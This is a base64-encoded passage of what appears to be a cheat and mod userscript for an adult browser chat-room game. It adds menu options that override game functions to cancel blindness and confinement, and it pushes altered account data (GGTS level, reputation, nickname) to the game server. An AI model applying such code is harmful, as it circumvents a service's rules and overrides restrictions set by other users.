ZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEwIikgewogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUpOwogICAgTG9nQWRkKCJDbHViU2xhdmUiLCAiTWFuYWdlbWVudCIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQmxvY2tDaGFuZ2UiLCAiUnVsZSIsIEN1cnJlbnRUaW1lKTsKICAgIE1hbmFnZW1lbnRJc0NsdWJTbGF2ZSA9IGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIGZhbHNlCiAgICB9CiAgICBNYW5hZ2VtZW50Q2x1YlNsYXZlRGlhbG9nID0gZnVuY3Rpb24oUGxheWVyKSB7fQogICAgTWFuYWdlbWVudEZpbmlzaENsdWJTbGF2ZSgpCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMSIpIHsKICAgIGphdmFzY3JpcHQ6YWxlcnQoJ1N0YXJ0IGEgR0dUUyBzZXNzaW9uIGJlZm9yZSBydW5uaW5nLCByZWZyZXNoIHRvIHNlZSBjaGFuZ2VzJyk7CiAgICBQbGF5ZXIuR2FtZS5HR1RTLkxldmVsID0gcHJvbXB0KCJFbnRlciBHR1RTIExldmVsICgxLTYpIik7OwogICAgU2VydmVyQWNjb3VudFVwZGF0ZS5RdWV1ZURhdGEoewogICAgR2FtZTogUGxheWVyLkdhbWUKICAgIH0pOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICAgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEyIikgewogICAgamF2YXNjcmlwdDpEaWFsb2dTZXRSZXB1dGF0aW9uKCJEb21pbmFudCIsIHByb21wdCgiRW50ZXIgU3ViL0RvbSBSZXAgKC0xMDAgdG8gMTAwKSIpKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTMiKSB7CiAgICBqYXZhc2NyaXB0Om5hbWUgPSBwcm9tcHQoIkVudGVyIE5pY2tuYW1lIik7OwogICAgUGxheWVyLk5pY2tuYW1lID0gbmFtZTsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsgTmlja25hbWU6IG5hbWUgfSwgdHJ1ZSk7ICAgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOyAgCiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTQiKSB7CiAgICBqYXZhc2NyaXB0OkFjdGl2aXR5U2V0QXJvdXNhbChQbGF5ZXIsIDEpOwogICAgQWN0aXZpdHlPcmdhc21QcmVwYXJlKFBsYXllciwgdHJ1ZSk7CiAgICBBY3Rpdml0eU9yZ2FzbUdhbWVSZXNpc3RDb3VudCA9IDE7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE1IikgewogICAgamF2YXNjcmlwdDp3aW5kb3cub3BlbignaHR0cHM6Ly9kaXNjb3JkLmdnL3YzSkJqeVM0bXgnLCAnX2JsYW5rJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE2IikgewogICAgamF2YXNjcmlwdDooZnVuY3Rpb24oKSB7bGV0IGlucHV0ID0gcHJvbXB0KCJNYWxlIC8gRmVtYWxlIC8gTWl4ZWQiKTsKICAgIGxldCBwbGFjZWhvbGRlcjsKICAgIAogICAgaWYgKGlucHV0LnRvTG93ZXJDYXNlKCkgPT09ICJtYWxlIikgewogICAgICBwbGFjZWhvbGRlciA9ICJNIjsKICAgIH0gZWxzZSBpZiAoaW5wdXQudG9Mb3dlckNhc2UoKSA9PT0gIm1peGVkIikgewogICAgICBwbGFjZWhvbGRlciA9ICJYIjsKICAgIH0gZWxzZSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIiI7CiAgICB9ICAKCiAgICAKICAgIENoYXRSb29tU3RhcnQocGxhY2Vob2xkZXIsICIiLCBudWxsLCBudWxsLCAiSW50cm9kdWN0aW9uIiwgQmFja2dyb3VuZHNUYWdMaXN0KTsKICB9KSgpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNyIpIHsKICAgIGphdmFzY3JpcHQ6KGZ1bmN0aW9uKCkge2xldCBpbnB1dCA9IHByb21wdCgiU3RhcnQgYSBMQVJQIFJvb20gYXMgQWRtaW4gRmlyc3RcblN0YXJ0IC8gU2tpcCAvIE1peGVkIC8gU2h1ZmZsZSAvIFRlYW0gLyBXaW4gKGNvbG9yKSIpLnRvTG93ZXJDYXNlKCk7CgogICAgaWYgKGlucHV0ID09PSAic3RhcnQiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tR2FtZSIsIHsgR2FtZVByb2dyZXNzOiAiU3RhcnQiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInNraXAiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tR2FtZSIsIHsgR2FtZVByb2dyZXNzOiAiU2tpcCIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAic2h1ZmZsZSIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsgTWVtYmVyTnVtYmVyOiBDaGF0Um9vbUNoYXJhY3RlclsxXS5NZW1iZXJOdW1iZXIsIEFjdGlvbjogIlNodWZmbGUiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInRlYW0iKSB7CiAgICAgIGNvbnN0IERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeUJ1aWxkZXIoKQogICAgICAuc291cmNlQ2hhcmFjdGVyKFBsYXllcikKICAgICAgLmJ1aWxkKCk7CiAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUNoYXQiLCB7IENvbnRlbnQ6ICJMQVJQQ2hhbmdlVGVhbUNsYXNzIiwgVHlwZTogIkFjdGlvbiIsIERpY3Rpb25hcnk6IERpY3Rpb25hcnkgfSk7CiAgfSBlbHNlIGlmIChpbnB1dC5zdGFydHNXaXRoKCJ3aW4iKSkgewogICAgICBsZXQgY29sb3IgPSBpbnB1dC5zbGljZSg0KS50cmltKCk7CiAgICAgIGNvbG9yID0gY29sb3IuY2hhckF0KDApLnRvVXBwZXJDYXNlKCkgKyBjb2xvci5zbGljZSgxKTsKICAgICAgR2FtZUxBUlBBZGRDaGF0TG9nKCJFbmRHYW1lIiwgUGxheWVyLCBQbGF5ZXIsIE9ubGluZUdhbWVEaWN0aW9uYXJ5VGV4dCgiVGVhbSIgKyBjb2xvciksIDAsIDAsICIjMDAwMEIwIik7CiAgICB9CiAgfSkoKTsKCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE4IikgewogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYnV0dG9uQ29udGFpbmVyKTsKICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTkiKSB7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNldHRpbmdzTWVudSk7CiAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0KICAKCiAgLy8gSGlkZSBkZCBtZW51CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0pOwoKLy9FbmQgb2YgREQgbWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgoKZnVuY3Rpb24gdXBkYXRlQ29udGV4dE1lbnUoKSB7CiAgd2hpbGUgKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpIHsKICAgIGNvbnRleHRNZW51LnJlbW92ZUNoaWxkKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChoZWFkZXIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24yKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24zKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b240KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b241KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b242KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b243KTsKICBpZiAodmlzYikgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOCk7CiAgfSBlbHNlIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjkpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xMCk7CiAgLy8gQWRkIHRoZSBkZCBtZW51IHRvIHRoZSBjb250ZXh0IG1lbnUKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoZHJvcGRvd25CdXR0b24pOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKHNlbGVjdCk7CiAgCn0KdXBkYXRlQ29udGV4dE1lbnUoKTsKLy8gVXBkYXRlIGNvbnRleHQgIG1lbnUgd2hlbiBvcGVuZWQKY29udGV4dE1lbnUuYWRkRXZlbnRMaXN0ZW5lcignY29udGV4dG1lbnUnLCBmdW5jdGlvbigpIHsKICB1cGRhdGVDb250ZXh0TWVudSgpOwp9KTsKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7Cn0pOwoKLy8gSGlkZSB0aGUgY29udGV4dCBtZW51CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICAgICAgdmFyIGNvbnRleHRNZW51ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W3N0eWxlKj0nZml4ZWQnXSIpOwogICAgICAgIGlmIChjb250ZXh0TWVudSkgewogICAgICAgICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgICAgICAgIERpYWxvZ0xlYXZlKCk7CiAgICAgICAgfQogICAgICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgfQp9KTsKCgovL1N0YXJ0IG9mIGtleWJvYXJkIHNob3J0Y3V0c19fX19fX19fX19fX19fX19fX18KCmxldCBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKbGV0IGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIiAmJiAhYmFja3RpY2tQcmVzc2VkKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSB0cnVlOwogIH0KICBlbHNlIGlmIChiYWNrdGlja1ByZXNzZWQpIHsKICAgIGxhc3RLZXlQcmVzc2VkID0gZXZlbnQua2V5OwogIH0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKICAgIGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKICB9Cn0pOwoKc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgaWYgKGxhc3RLZXlQcmVzc2VkID09PSAiLCIgfHwgbGFzdEtleVByZXNzZWQgPT09ICIuIikgewogICAgbGV0IGFjdGlvbiA9IGxhc3RLZXlQcmVzc2VkID09PSAiLCIgPyAiTW92ZUxlZnQiIDogIk1vdmVSaWdodCI7CiAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUFkbWluIiwgewogICAgICBNZW1iZXJOdW1iZXI6IFBsYXllci5NZW1iZXJOdW1iZXIsCiAgICAgIEFjdGlvbjogYWN0aW9uLAogICAgfSk7CiAgfQp9LCA1MCk7Ci8vU3RhcnQgb2YgUGVyc2lzdGFudCBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKY29uc3Qgc2V0dGluZ3NNZW51ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnNldHRpbmdzTWVudS5pZCA9ICJzZXR0aW5ncy1tZW51IjsKc2V0dGluZ3NNZW51LnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKc2V0dGluZ3NNZW51LnN0eWxlLnRvcCA9ICIyMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmxlZnQgPSAiMjBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2ZmZiI7CnNldHRpbmdzTWVudS5zdHlsZS5ib3JkZXIgPSAiMXB4IHNvbGlkICNjY2MiOwpzZXR0aW5nc01lbnUuc3R5bGUucGFkZGluZyA9ICIzcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjEwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKc2V0dGluZ3NNZW51LnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKCi8vQkNNIGxvZ28gICAKY29uc3QgQkNNRWxvZ28xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CkJDTUVsb2dvMS5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKQkNNRWxvZ28xLnN0eWxlLmZsb2F0ID0gImxlZnQiOwpCQ01FbG9nbzEuc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CkJDTUVsb2dvMS5zdHlsZS53aWR0aCA9ICI0MHB4IjsgCkJDTUVsb2dvMS5zdHlsZS5oZWlnaHQgPSAiNDBweCI7IApzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQoQkNNRWxvZ28xKTsKCi8vT3B0aW9ucyBhbmQgc3R5bGVfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKY29uc3Qgb3B0aW9uMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjEudGV4dENvbnRlbnQgPSAiQW50aWJsaW5kIjsKY29uc3QgY2hlY2tib3gxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gxLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDEuaWQgPSAib3B0aW9uMSI7CmNoZWNrYm94MS5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDEuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24xLmFwcGVuZENoaWxkKGNoZWNrYm94MSk7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24xKTsKCmNvbnN0IG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24yLnRleHRDb250ZW50ID0gIlJlYWxpc3RpYyBUYWxraW5nIjsKY29uc3QgY2hlY2tib3gyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gyLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDIuaWQgPSAib3B0aW9uMiI7CmNoZWNrYm94Mi5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDIuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24yLmFwcGVuZENoaWxkKGNoZWNrYm94Mik7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24yKTsKCmNvbnN0IG9wdGlvbjMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24zLnRleHRDb250ZW50ID0gIlNvdW5kIjsKY29uc3QgY2hlY2tib3gzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTsKY2hlY2tib3gzLnR5cGUgPSAiY2hlY2tib3giOwpjaGVja2JveDMuaWQgPSAib3B0aW9uMyI7CmNoZWNrYm94My5zdHlsZS5tYXJnaW5SaWdodCA9ICI1cHgiOwpjaGVja2JveDMuc3R5bGUudmVydGljYWxBbGlnbiA9ICJtaWRkbGUiOwpvcHRpb24zLmFwcGVuZENoaWxkKGNoZWNrYm94Myk7CnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChvcHRpb24zKTsKCm9wdGlvbjEuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMS5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24xLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMS5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjEuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24xLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMi5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24yLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24yLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjMuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMy5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24zLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMy5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjMuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24zLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjEuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpvcHRpb24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24yLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKb3B0aW9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMy5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCi8vIENoZWNrYm94IHN0YXRlIHdoZW4gdGhlIHBhZ2UgbG9hZHMKY2hlY2tib3gxLmNoZWNrZWQgPyBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwpjaGVja2JveDIuY2hlY2tlZCA/IG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CmNoZWNrYm94My5jaGVja2VkID8gb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCgovLyBDaGFuZ2VzIGxhYmVsIGJhY2tncm91bmQgY29sb3Igd2hlbiB0aGUgY2hlY2tib3ggaXMgY2hlY2tlZApjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CmNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKLy9PcHRpb25zIEFjdGlvbnNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKZnVuY3Rpb24gcnVuT3B0aW9uMSgpIHsKICAgIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgICBmdW5jdGlvbiBHZXRCbGluZExldmVsMCgpIHsKICAgICAgICBsZXQgYmxpbmRMZXZlbCA9IDA7CiAgICAgICAgcmV0dXJuIGJsaW5kTGV2ZWw7CiAgICAgIH0KICAgICAgUGxheWVyLkdldEJsaW5kTGV2ZWwgPSBHZXRCbGluZExldmVsMDsKICAgICAgUGxheWVyLkdldEJsaW5kTGV2ZWwoKTsKICAgIH0KICB9CiAgCiAgZnVuY3Rpb24gcnVuT3B0aW9uMigpIHsKICAgIGZ1bmN0aW9uIFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwKCkgewogICAgICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIk1vdXRoIiwgZXhwcmVzc2lvbkFuaW1hdGlvbltleHByZXNzaW9uQW5pbWF0aW9uSW5kZXgrK10pOwogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4IDwgZXhwcmVzc2lvbkFuaW1hdGlvbi5sZW5ndGgpIHsKICAgICAgICBzZXRUaW1lb3V0KFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwLCAxMDAwKTsKICAgICAgfSBlbHNlIHsKICAgICAgICBleHByZXNzaW9uQW5pbWF0aW9uID0gbnVsbDsKICAgICAgfQogICAgfQogIAogICAgZnVuY3Rpb24gUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihsaXN0KSB7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb24gPSBsaXN0OwogICAgICBleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPSAwOwogICAgICBleHByZXNzaW9uQW5pbWF0aW9uRXggPSBJbnZlbnRvcnlHZXQoUGxheWVyLCAiTW91dGgiKTsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb25FeCAmJiBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkgJiYgZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5LkV4cHJlc3Npb24pIHsKICAgICAgICBleHByZXNzaW9uQW5pbWF0aW9uW2V4cHJlc3Npb25BbmltYXRpb24ubGVuZ3RoIC0gMV0gPSBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkuRXhwcmVzc2lvbjsgLy9zZXQgbGFzdCB0byBjdXJyZW50CiAgICAgIH0KICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAoKTsKICAgIH0KICAKICAgIGZ1bmN0aW9uIE5FV3RhbGtpbmcoKSB7CiAgICAgIHZhciBtc2cgPSBFbGVtZW50VmFsdWUoIklucHV0Q2hhdCIpLnRyaW0oKTsKICAgICAgaWYgKCFtc2cuc3RhcnRzV2l0aCgiLyIpICYmICFtc2cuc3RhcnRzV2l0aCgiKiIpICYmICFtc2cuc3RhcnRzV2l0aCgiISIpKSB7CiAgICAgICAgaWYgKG1zZy5sZW5ndGggPiAxMCkgewogICAgICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihbbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGxdKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihbbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsXSk7CiAgICAgICAgfQogICAgICB9CiAgICAgIE9MRHRhbGtpbmcoKTsKICAgIH0KICAKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICB2YXIgZXhwcmVzc2lvbkFuaW1hdGlvbjsKICAgICAgdmFyIGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA9IDA7CiAgICAgIHZhciBPTER0YWxraW5nID0gQ2hhdFJvb21TZW5kQ2hhdDsKICAgICAgQ2hhdFJvb21TZW5kQ2hhdCA9IE5FV3RhbGtpbmc7CiAgICB9CiAgfQoKICBmdW5jdGlvbiBydW5PcHRpb24zKCkgewogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiA